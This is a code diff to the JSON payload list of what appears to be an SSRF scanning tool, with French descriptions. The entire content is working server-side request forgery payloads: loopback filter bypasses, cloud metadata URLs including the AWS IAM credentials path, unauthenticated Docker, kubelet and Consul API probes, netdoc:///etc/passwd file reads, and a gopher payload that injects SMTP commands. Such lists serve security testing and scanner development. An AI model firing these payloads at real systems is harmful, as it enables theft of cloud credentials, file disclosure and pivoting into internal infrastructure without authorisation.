@@ -9,7 +9,12 @@
       {"payload": "http://127.1",              "description": "Short IPv4", "confidence_hint": 80, "description_extra": "Bypass simple filter"},
       {"payload": "http://2130706433/",        "description": "IPv4 en décimal (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
       {"payload": "http://0177.0.0.1/",        "description": "IPv4 en octal (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
-      {"payload": "http://[::ffff:127.0.0.1]", "description": "IPv4-mapped IPv6 (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"}
+      {"payload": "http://[::ffff:127.0.0.1]", "description": "IPv4-mapped IPv6 (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "http://0x7f000001/", "description": "IPv4 en hexadécimal (bypass filtre regex)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "http://0.0.0.0/", "description": "Adresse wildcard — souvent absente des blocklists qui ne vérifient que 127.0.0.1/localhost", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "http://127.0.0.1.nip.io/", "description": "Service DNS wildcard résolvant vers 127.0.0.1 — contourne un filtre sur la chaîne littérale '127.0.0.1'/'localhost'", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "http://expected-host@127.0.0.1/", "description": "Confusion userinfo (@) — un contrôle naïf sur le début de l'URL voit 'expected-host' mais le client HTTP résout 127.0.0.1", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "http://[::]:80/", "description": "Adresse IPv6 non spécifiée (any-address) — distincte de ::1, parfois absente des filtres", "confidence_hint": 60, "depth": "aggressive"}
     ],
     "metadata": [
       {"payload": "http://169.254.169.254/latest/meta-data/",    "description": "AWS metadata", "confidence_hint": 95},
@@ -17,7 +22,14 @@
       {"payload": "http://169.254.169.254/metadata/v1/",         "description": "Azure metadata", "confidence_hint": 90, "depth": "aggressive"},
       {"payload": "http://100.100.100.200/latest/meta-data/",    "description": "Alibaba Cloud (ECS) metadata", "confidence_hint": 85, "depth": "aggressive"},
       {"payload": "http://169.254.169.254/metadata/v1.json",     "description": "DigitalOcean (Droplet) metadata", "confidence_hint": 85, "depth": "aggressive"},
-      {"payload": "http://169.254.169.254/opc/v1/instance/",     "description": "Oracle Cloud (OCI) metadata v1 (sans header requis)", "confidence_hint": 85, "depth": "aggressive"}
+      {"payload": "http://169.254.169.254/opc/v1/instance/",     "description": "Oracle Cloud (OCI) metadata v1 (sans header requis)", "confidence_hint": 85, "depth": "aggressive"},
+      {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "AWS — énumère le rôle IAM attaché à l'instance (chemin exploité lors de la fuite Capital One)", "confidence_hint": 80, "depth": "aggressive"},
+      {"payload": "http://metadata.tencentyun.com/latest/meta-data/", "description": "Tencent Cloud (CVM) metadata", "confidence_hint": 80, "depth": "aggressive"},
+      {"payload": "http://169.254.169.254/openstack/latest/meta_data.json", "description": "OpenStack Nova config-drive/metadata — couvre aussi les clouds privés compatibles OpenStack (ex: Huawei Cloud ECS)", "confidence_hint": 75, "depth": "aggressive"},
+      {"payload": "http://127.0.0.1:10255/pods", "description": "Kubernetes — API kubelet en lecture seule (port 10255), non authentifiée par défaut", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "http://127.0.0.1:2375/containers/json", "description": "Docker Engine API exposée en TCP sans authentification (misconfiguration classique)", "confidence_hint": 70, "depth": "aggressive"},
+      {"payload": "http://127.0.0.1:8500/v1/agent/self", "description": "HashiCorp Consul — info agent HTTP API, reconnaissance avant pivot RCE via service-registration", "confidence_hint": 65, "depth": "aggressive"},
+      {"payload": "https://metadata.platformequinix.com/metadata", "description": "Equinix Metal (ex-Packet) — metadata non authentifiée, identifie l'appelant par IP source", "confidence_hint": 70, "depth": "aggressive"}
     ],
     "schemes": [
       {"payload": "file:///etc/hostname",  "description": "File scheme (Linux)", "confidence_hint": 90},
@@ -26,7 +38,11 @@
       {"payload": "dict://127.0.0.1:6379/info", "description": "Redis info via dict", "confidence_hint": 85, "depth": "aggressive"},
       {"payload": "ftp://127.0.0.1/", "description": "FTP scheme — sonde un service non-HTTP", "confidence_hint": 60, "depth": "extended"},
       {"payload": "ldap://127.0.0.1/", "description": "LDAP scheme exotique", "confidence_hint": 65, "depth": "aggressive"},
-      {"payload": "sftp://127.0.0.1:22/", "description": "SFTP scheme exotique", "confidence_hint": 60, "depth": "aggressive"}
+      {"payload": "sftp://127.0.0.1:22/", "description": "SFTP scheme exotique", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "tftp://127.0.0.1:69/TESTUDPPACKET", "description": "TFTP scheme — protocole UDP distinct, sonde un service rarement filtré", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "jar:http://127.0.0.1!/", "description": "Wrapper Java jar: — entièrement blind, utile contre les clients HTTP basés sur l'URLConnection Java", "confidence_hint": 45, "depth": "aggressive"},
+      {"payload": "netdoc:///etc/passwd", "description": "Wrapper Java netdoc: — équivalent de file: qui contourne un filtre sur le mot-clé littéral 'file:'", "confidence_hint": 50, "depth": "aggressive"},
+      {"payload": "gopher://127.0.0.1:25/_MAIL%20FROM:%3Cattacker@example.com%3E%0D%0A", "description": "Gopher — envoie des octets bruts à un service TCP (ici injection de commande SMTP), au-delà de la simple sonde de port", "confidence_hint": 55, "depth": "aggressive"}
     ]
   }
 }
